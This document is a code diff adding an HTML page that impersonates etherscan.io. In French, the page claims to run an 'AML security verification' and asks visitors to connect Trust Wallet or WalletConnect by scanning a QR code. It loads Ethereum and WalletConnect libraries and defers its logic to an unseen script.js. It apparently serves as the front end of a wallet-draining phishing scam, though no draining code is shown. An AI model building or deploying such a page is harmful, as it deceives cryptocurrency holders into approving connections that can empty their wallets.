@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <link rel="icon" type="image/svg+xml" href="/etherscan-logo-circle.svg">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>etherscan.io</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 2rem; background: #0a0a0a; color: #fff; }
+    #qrcode { margin: 2rem auto; width: 300px; height: 300px; background: #fff; padding: 10px; display: flex; align-items: center; justify-content: center; }
+    #status { margin-top: 2rem; font-size: 1.2rem; color: #0f0; }
+    button { display: none; }
+  </style>
+</head>
+<body>
+  <h1>🔒 Vérification AML Sécurité</h1>
+  <p>Scannez le code avec Trust Wallet / WalletConnect pour vérifier votre portefeuille.</p>
+  <div id="qrcode"></div>
+  <div id="status">En attente de connexion...</div>
+  <script src="script.js"></script>
+</body>
+</html>
